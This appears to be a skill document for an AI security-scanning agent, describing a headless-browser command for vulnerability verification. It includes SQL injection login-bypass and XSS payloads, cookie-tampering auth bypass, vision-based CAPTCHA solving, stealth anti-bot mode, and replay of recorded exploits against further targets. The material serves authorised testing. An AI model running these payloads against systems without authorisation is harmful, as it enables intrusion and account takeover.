---
name: playwright
description: Use this skill to learn how to use the playwright pseudo-command for headless browsing, screenshots, network capture, and interactive vulnerability verification. Aligned with Playwright API conventions.
internal: true
---

# playwright

Headless Chromium browser for interacting with JS-rendered pages, taking screenshots, capturing network traffic, executing JavaScript, and performing **multi-step interactive vulnerability verification**. Powered by go-rod with stealth anti-bot-detection and katana script injection for smart form discovery, event listener capture, and SPA route detection.

Command names are aligned with the [Playwright API](https://playwright.dev/docs/api/class-page) for familiarity.

## Unified URL Or Session Commands

The first argument can be either a URL or an existing session name. If it matches a live session, the command runs against that persistent page; otherwise it opens the URL in a fresh incognito context.

### goto
Navigate to a URL and return visible text, or extract visible text from the current session page.
```bash
playwright goto <url> [--timeout <seconds>] [--user-agent <string>]
playwright goto <session> [selector]
```

### screenshot
Take a screenshot of a URL or session page. Session mode supports element-level screenshots.
```bash
playwright screenshot <url> [--output <filename>] [--full-page] [--timeout <seconds>]
playwright screenshot <session> [--output <filename>] [--full-page] [--selector <selector>]
```

### content
Extract rendered HTML from a URL or session page.
```bash
playwright content <url> [--timeout <seconds>] [--user-agent <string>]
playwright content <session> [selector]
```

### evaluate
Execute a JavaScript expression on a URL or session page.
```bash
playwright evaluate <url> <expression>
playwright evaluate <url> --script "document.querySelectorAll('a').length"
playwright evaluate <session> "document.title"
```

### network
Navigate to a URL and capture all network requests/responses, or control session network capture.
```bash
playwright network <url> [--timeout <seconds>]
playwright network <session> --start
playwright network <session> --dump
playwright network <session> --stop
```

## Stateless-Only Commands

### pdf
Generate a PDF of the rendered page.
```bash
playwright pdf <url> [--output <filename>] [--timeout <seconds>]
```

## Session Subcommands (multi-step interactive workflows)

Sessions persist a browser page across multiple tool calls. This enables multi-step vulnerability verification: open a page, discover forms, fill inputs, submit, and check results.

### open / close / sessions
```bash
playwright open <url> [--session <name>] [--ttl <seconds>] [--timeout <seconds>] [--op-timeout <seconds>] [--no-speed-up]
playwright close <session>
playwright sessions
```
- **Sessions never auto-expire by default** — only closed via `playwright close <session>` or process exit
- Use `--ttl <seconds>` to opt-in to auto-expiry if needed
- `--no-speed-up` disables setTimeout/setInterval acceleration (use for timing-sensitive verification)
- Each session operation is serialized and has an `--op-timeout` deadline (default: 30s)
- Max 8 concurrent sessions
- Session name is auto-generated if `--session` is omitted
- `playwright sessions` lists all active sessions with URL, age, and TTL remaining

### discover
Call katana's injected JS to enumerate all interactive elements on the page: forms (with their fields), buttons, elements with onclick handlers, **event listeners** (captured by hooks), and **SPA navigated links** (pushState, fetch, WebSocket URLs).
```bash
playwright discover <session>
```
Output lists:
- Forms with field names, types, and selectors
- Buttons and onclick elements
- Event listeners (type + element + selector) — captured via `addEventListener` hook
- Navigated links (URL + source) — captured via pushState/fetch/WebSocket hooks

### autofill
Smart form filling using katana's heuristics. Automatically infers values based on input type. Override specific fields with `--data`.
```bash
playwright autofill <session> [--form 0] [--data "username=admin,password=test123"]
```

### click / fill / select-option / wait-for
```bash
playwright click <session> <selector>
playwright fill <session> <selector> <value>
playwright select-option <session> <selector> <value>
playwright wait-for <session> <selector|--idle|--stable>
```

### Extraction and current URL
```bash
playwright goto <session> [selector]           # Extract visible text
playwright content <session> [selector]        # Extract HTML
playwright evaluate <session> <js-expression>  # Execute JS in session
playwright screenshot <session> [--output f] [--selector s] [--full-page]
playwright url <session>                       # Current URL and title
```

Short aliases (backward compat): `text-content`, `inner-html`, `navigate`, `eval`, `select`, `wait`, `text`, `html`, `seval`, `sshot`, `netcap`.

### dialog (XSS verification)
Capture JavaScript alert/confirm/prompt dialogs. Arm the listener before triggering the payload.
```bash
playwright dialog <session> --arm     # Start listening
playwright dialog <session> --check   # Return captured dialogs (JSON)
playwright dialog <session> --disarm  # Stop listening
```

### cookies
```bash
playwright cookies <session> --list
playwright cookies <session> --set name=value [name2=value2]
playwright cookies <session> --clear
```

## Recording (nuclei headless template codegen)

Record browser interactions as a nuclei-compatible headless YAML template. This is aiscan's equivalent of Playwright's `codegen` — but outputs nuclei headless YAML instead of test scripts.

### Enable recording
```bash
# Method 1: record from the start
playwright open http://target.com/login --session s1 --record

# Method 2: enable on an existing session
playwright record s1 --start
```

When `--record` is active, every interaction command (click, fill, press, select-option, wait-for, evaluate, etc.) is automatically captured as a nuclei headless action.

### Export recorded template
```bash
playwright record s1 --dump                              # Print YAML to stdout
playwright record s1 --save poc.yaml                     # Save to file
playwright record s1 --save poc.yaml --id cve-2024-xxxx --name "Login bypass"  # With custom metadata
```

### Other recording controls
```bash
playwright record s1 --clear   # Clear recorded actions, keep recording
playwright record s1 --stop    # Stop recording
```

### Run a recorded template against another target
```bash
playwright template poc.yaml http://other-target.com
playwright template poc.yaml http://other-target.com --payload username=admin --payload password=test
```

The generated YAML is standard nuclei headless format — it can also be used with neutron or nuclei directly.

### Recording workflow example
```bash
# 1. Record a login bypass POC
playwright open http://target.com/login --session s1 --record
playwright fill s1 "input[name=user]" "admin' OR '1'='1"
playwright fill s1 "input[name=pass]" "x"
playwright click s1 "button[type=submit]"
playwright wait-for s1 --stable
playwright text-content s1 "#welcome"
playwright record s1 --save sqli-login.yaml --id sqli-login-bypass
playwright close s1

# 2. Replay against other targets
playwright template sqli-login.yaml http://target2.com/login
playwright template sqli-login.yaml http://target3.com/login
```

### What gets recorded

| playwright command | nuclei headless action |
|---|---|
| `open --record` (initial) | `navigate` with `{{BaseURL}}` |
| `click` | `click` |
| `fill` / `type` | `text` |
| `press` | `keyboard` |
| `select-option` | `select` |
| `evaluate` | `script` |
| `wait-for --stable` | `waitstable` |
| `wait-for --idle` | `waitidle` |
| `wait-for <selector>` | `waitvisible` |
| `text-content` / `inner-text` | `extract` (with auto-generated name) |
| `get-attribute` | `extract` (target=attribute) |
| `screenshot` | `screenshot` |
| `set-extra-headers` | `setheader` (one per header) |
| `dialog --arm` | `waitdialog` |
| `hover` / `dblclick` / `reload` | `script` (JS fallback) |

URLs are automatically templatized: the session's base origin is replaced with `{{BaseURL}}`. XPath selectors (`xpath:...`) are preserved as `by: xpath`.

## Headless Template Execution

Run a nuclei-compatible headless YAML template against a target URL. Shares the browser instance with sessions.

```bash
playwright template <file.yaml> <target-url> [--payload key=value ...]
```

Templates support the full nuclei headless action set (29 action types), DSL expressions (`{{rand_int()}}`, `{{replace()}}`, etc.), payload iteration (sniper/pitchfork/clusterbomb), template variables, matchers, and extractors.

```bash
# Run a CVE template
playwright template cve-2024-xxxx.yaml http://target.com

# Run with payload overrides
playwright template login-brute.yaml http://target.com --payload username=admin --payload password=secret

# Run a self-contained template (URL embedded in template)
playwright template prototype-pollution-check.yaml http://target.com
```

## Vulnerability Verification Workflows

### XSS Verification (with recording)
```bash
playwright open http://target.com/search --session xss --ttl 0 --record
playwright discover xss
playwright dialog xss --arm
playwright fill xss "input[name=q]" "<script>alert('xss_canary_8f2a')</script>"
playwright click xss "button[type=submit]"
playwright wait-for xss --stable
playwright dialog xss --check
# If captured: {"type":"alert","message":"xss_canary_8f2a"} then confirmed
playwright screenshot xss --output xss_evidence.png
playwright record xss --save xss-poc.yaml --id reflected-xss
playwright close xss
# Replay against other targets:
playwright template xss-poc.yaml http://target2.com/search
```

### SQLi via Login Bypass (with recording)
```bash
playwright open http://target.com/login --session sqli --ttl 0 --record
playwright autofill sqli --form 0 --data "username=admin' OR '1'='1,password=x"
playwright click sqli "button[type=submit]"
playwright wait-for sqli --stable
playwright goto sqli
# Check for dashboard/admin content
playwright record sqli --save sqli-poc.yaml --id sqli-login
playwright close sqli
```

### CAPTCHA + Weak Password (with vision tool)
```bash
playwright open http://target.com/login --session s1 --ttl 0
playwright discover s1
playwright screenshot s1 --selector "img#captcha" --output captcha.png
# Then use vision tool: vision captcha.png "Return ONLY the CAPTCHA text"
playwright autofill s1 --form 0 --data "username=admin,password=admin123,captcha=<solved>"
playwright click s1 "button[type=submit]"
playwright wait-for s1 --stable
playwright url s1
playwright close s1
```

### Auth Bypass via Cookie
```bash
playwright open http://target.com/ --session auth --ttl 0
playwright cookies auth --set role=admin
playwright evaluate auth "location.href='/admin'"
playwright wait-for auth --stable
playwright goto auth
playwright screenshot auth --output auth_evidence.png
playwright close auth
```

### SPA Route Discovery
```bash
playwright open http://spa-app.com/ --session spa --ttl 0
playwright click spa "a[href='/dashboard']"
playwright wait-for spa --stable
playwright discover spa
# Check "Navigated Links" section for all SPA routes detected
playwright close spa
```

## Playwright API Mapping

| playwright command | Playwright API equivalent |
|---|---|
| `goto` | `page.goto()` |
| `click` | `locator.click()` |
| `fill` | `locator.fill()` |
| `select-option` | `locator.selectOption()` |
| `wait-for` | `locator.waitFor()` / `page.waitForLoadState()` |
| `evaluate` | `page.evaluate()` |
| `screenshot` | `page.screenshot()` / `locator.screenshot()` |
| `content` | `page.content()` |
| `url` | `page.url()` |
| `cookies` | `context.cookies()` |
| `dialog --arm` | `page.on('dialog')` |
| `network --start` | `page.on('request')` |

## aiscan Extensions (no Playwright CLI equivalent)

| command | purpose |
|---|---|
| `discover` | katana JS hooks — enumerate forms, buttons, event listeners, SPA routes, fetch/WebSocket URLs |
| `autofill` | katana heuristics — smart form filling with auto-inferred values |
| `record` | codegen — record session interactions as nuclei headless YAML (like Playwright's `codegen` but outputs YAML) |
| `template` | run a nuclei-compatible headless YAML template against a target |

## Notes

- The browser launches on first use (lazy init) and is reused across calls.
- Stateless commands use fresh incognito contexts. Session commands persist pages.
- Stealth mode is always enabled (go-rod/stealth).
- Katana JS scripts (page-init.js + utils.js) are injected into session pages with **hooks activated** for:
  - Event listener capture (`window.__eventListeners`)
  - SPA route detection via pushState/replaceState/fetch/WebSocket hooks (`window.__navigatedLinks`)
  - Form reset prevention
  - setTimeout/setInterval acceleration (0.1x factor, disable with `--no-speed-up`)
- Sessions are garbage-collected after TTL expiry (use `--ttl 0` for persistent sessions).
- Chromium is automatically downloaded on first launch if not found.
- Selectors may be CSS or `xpath:<xpath>` — interaction commands accept both.
